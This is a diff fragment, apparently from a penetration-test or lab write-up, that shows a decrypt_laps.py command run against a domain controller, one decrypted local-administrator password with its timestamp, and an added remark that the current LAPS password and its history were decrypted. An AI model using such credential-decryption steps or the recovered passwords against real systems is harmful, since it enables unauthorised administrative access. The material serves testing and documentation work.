@@ -528,3 +528,5 @@ python3 decrypt_laps.py -f lapspasswords.txt -s dc01.trask.hsm -k
     2026-03-02 17:43:08 UTC  ->  /i!jkcVjs98!
 ```
 
+I have managed to decrypt the current LAPS password and the LAPS history, so 6 new passwords
+
